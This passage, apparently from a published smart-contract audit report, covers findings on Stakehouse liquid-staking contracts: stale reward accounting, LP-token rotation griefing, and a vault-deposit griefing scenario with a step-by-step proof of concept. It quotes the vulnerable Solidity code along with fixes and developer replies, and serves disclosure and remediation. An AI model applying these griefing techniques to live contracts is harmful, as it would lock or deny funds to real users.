calldata _blsPubKeys</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) external nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i; i &lt; _blsPubKeys.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;Unknown BLS public key&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Ensure that the BLS key has its derivatives minted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;Derivatives not minted&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (i == 0 &amp;&amp; !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _claimFundsFromSyndicateForDistribution(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                liquidStakingNetworkManager.syndicate(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _blsPubKeys</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Distribute ETH per LP</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            updateAccumulatedETHPerLP();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken token = lpTokenForKnot[_blsPubKeys[i]];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(address(token) != address(0), &quot;Invalid BLS key&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(token.lastInteractedTimestamp(msg.sender) + 30 minutes &lt; block.timestamp, &quot;Last transfer too recent&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The issue is that <code>updateAccumulatedETHPerLP()</code> is not guaranteed to be called, which means the ETH reward distribution in _distribute would use stale value, and users will not receive as many rewards as they should.<br>\n<code>updateAccumulatedETHPerLP</code> is only called if the first BLS public key is part of the syndicate. However, for the other keys it makes no reason not to use the up to date accumulatedETHPerLPShare value.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>User receives less rewards than they are eligible for if first passed BLS key is inactive.</p>\n<h3 id=\"recommended-mitigation-steps-49\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-49\" aria-label=\"recommended mitigation steps 49 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call updateAccumulatedETHPerLP() at the start of the function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410#issuecomment-1329370912\">vince0656 (Stakehouse) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is a dupe of issue <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408\">408 (M-28)</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410#issuecomment-1335919764\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’ve asked the warden to come in and highlight the differences between this and M-28.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410#issuecomment-1335928402\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi. Both rewards show different ways in which users don’t receive their eligible rewards.<br></p>\n<p>This report talks about use of an old accumulatedETHPerLPShare in the call to _distributeETHRewardsToUserForToken(). It will happen in any case where we don’t go into the if block. Using an old value means users won’t receive as much rewards as have been unlocked.<br>\nThe second report (M-28) is about _claimFundsFromSyndicateForDistribution not being called although it should be. suppose the blsPubKeys array has first element which is no longer part of syndicate, but the rest of the array are part of syndicate. Then we skip claiming funds from them. Therefore, there will be less funds to give away as rewards.</p>\n<p>One report is about incorrect <em>share value</em> leak, the second is about <em>total rewards</em> leak.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-30-giant-pools-are-prone-to-user-griefing-preventing-their-holdings-from-being-staked\" style=\"position:relative;\"><a href=\"#m-30-giant-pools-are-prone-to-user-griefing-preventing-their-holdings-from-being-staked\" aria-label=\"m 30 giant pools are prone to user griefing preventing their holdings from being staked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/415\">[M-30] Giant pools are prone to user griefing, preventing their holdings from being staked</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/415\">Trust</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L105\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L105</a></p>\n<p>batchRotateLPTokens in GiantMevAndFeesPool allows any user to rotate LP tokens of stakingFundsVaults around.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function batchRotateLPTokens(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address[] calldata _stakingFundsVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    LPToken[][] calldata _oldLPTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    LPToken[][] calldata _newLPTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[][] calldata _amounts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 numOfRotations = _stakingFundsVaults.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(numOfRotations &gt; 0, &quot;Empty arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(numOfRotations == _oldLPTokens.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(numOfRotations == _newLPTokens.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(numOfRotations == _amounts.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(lpTokenETH.balanceOf(msg.sender) &gt;= 0.5 ether, &quot;No common interest&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i; i &lt; numOfRotations; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>There is a check that sender has over 0.5 ether of lpTokenETH, to prevent griefing. However, this check is unsatisfactory as user can at any stage deposit ETH to receive lpTokenETH and burn it to receive back ETH. Their lpTokenETH holdings do not correlate with their interest in the vault funds.</p>\n<p>Therefore, malicious users can keep bouncing LP tokens around and prevent them from being available for actual staking by liquid staking manager.</p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Giant pools are prone to user griefing, preventing their holdings from being staked.</p>\n<h3 id=\"recommended-mitigation-steps-50\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-50\" aria-label=\"recommended mitigation steps 50 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Three options:</p>\n<ol>\n<li>batchRotateLPTokens should have logic to enforce that this specific rotation is logical</li>\n<li>Only DAO or some priviledged user can perform Giant pool operations</li>\n<li>Make the caller have something to lose from behaving maliciously, unlike the current status.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/415#issuecomment-1336214451\">vince0656 (Stakehouse) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This doesn’t factor in that when ETH is supplied to a liquid staking network, it has 30 minutes to be utilized for staking with the BLS public key - giant pool users can manage this inventory and move the liquidity between BLS keys but that’s by design and as mentioned above cannot move for 30 minutes at a time. If it never gets used, it can always go back to the giant pool</p>\n</blockquote>\n<hr>\n<h2 id=\"m-31-vaults-can-be-griefed-to-not-be-able-to-be-used-for-deposits\" style=\"position:relative;\"><a href=\"#m-31-vaults-can-be-griefed-to-not-be-able-to-be-used-for-deposits\" aria-label=\"m 31 vaults can be griefed to not be able to be used for deposits permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422\">[M-31] Vaults can be griefed to not be able to be used for deposits</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422\">Trust</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/368\">datapunk</a> and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/140\">Lambda</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L111\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L111</a></p>\n<p>Interaction with SavETHVault and StakingFundsVault require a minimum amount of <code>MIN_STAKING_AMOUNT</code>. In order to be used for staking, there needs to be 24 ETH or 4 ETH for the desired BLS public key in those vaults. The issue is that vaults can be griefed and made impossible to use for depositing by constantly making sure the <em>remaining</em> amount to be added to complete the deposit to the maxStakingAmountPerValidator, is under <code>MIN_STAKING_AMOUNT</code>.</p>\n<p>In _depositETHForStaking:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(_amount &gt;= MIN_STAKING_AMOUNT, &quot;Min amount not reached&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(_blsPublicKeyOfKnot.length == 48, &quot;Invalid BLS public key&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // LP token issued for the KNOT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // will be zero for a new KNOT because the mapping doesn&#39;t exist</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if(address(lpToken) != address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // KNOT and it&#39;s LP token is already registered</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // mint the respective LP tokens for the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // total supply after minting the LP token must not exceed maximum staking amount per validator</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(lpToken.totalSupply() + _amount &lt;= maxStakingAmountPerValidator, &quot;Amount exceeds the staking limit for the validator&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lpToken.mint(msg.sender, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // check that amount doesn&#39;t exceed max staking amount per validator</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_amount &lt;= maxStakingAmountPerValidator, &quot;Amount exceeds the staking limit for the validator&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...    </span></span></code></pre>\n<p>MED - Can grief vaults (SavETHVault, StakingFundsVault) and make them not able to be used for staking by depositing so that left to stake is &#x3C; <code>MIN_STAKING_AMOUNT</code>. Then it will fail maxStakingAmount check @ _depositEthForStaking</p>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Vaults can be griefed to not be able to be used for deposits.</p>\n<h3 id=\"proof-of-concept-43\" style=\"position:relative;\"><a href=\"#proof-of-concept-43\" aria-label=\"proof of concept 43 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>savETHVault has 22 ETH for some validator</li>\n<li>Attacker deposits 1.9991 ETH to the savETHVault</li>\n<li>vault now has 23.9991 ETH. The remaining to complete to 24 is 0.0009 ETH which is under 0.001 ether, min staking amount</li>\n<li>No one can complete the staking</li>\n</ol>\n<p>Note that depositers may try to remove their ETH and redeposit it to complete the deposit to 24. However attack may still keep the delta just under <code>MIN_STAKING_AMOUNT</code>.</p>\n<h3 id=\"recommended-mitigation-steps-51\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-51\" aria-label=\"recommended mitigation steps 51 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Handle the case where the remaining amount to be completed is smaller than <code>MIN_STAKING_AMOUNT</code>, and allow the deposit in that case.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 60 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/403\">report highlighted below</a> by <strong>0xSmartContract</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/434\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/431\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/426\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/405\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/400\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/390\">a12jmx</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/388\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/385\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/373\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/359\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/355\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/353\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/350\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/347\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/345\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/340\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/339\">CloudX</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/332\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/327\">immeas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/324\">Diana</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/322\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/321\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/316\">zaskoh</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/315\">bulej93</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/310\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/309\">Udsen</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/305\">gz627</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/289\">pedr02b2</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/285\">nogo</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/281\">zgo</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/272\">B2</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/265\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/250\">sakman</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/243\">0xmuxyz</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/236\">sahar</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/231\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/223\">aphak5010</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/209\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/205\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/203\">shark</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/193\">Awesome</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/185\">9svR6w</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/168\">trustindistrust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/161\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/159\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/158\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/151\">0xRoxas</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/95\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/85\">martin</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/80\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/69\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/66\">Secureverse</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/44\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/38\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/34\">clems4ever</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/26\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/16\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/13\">hl_</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/10\">pavankv</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 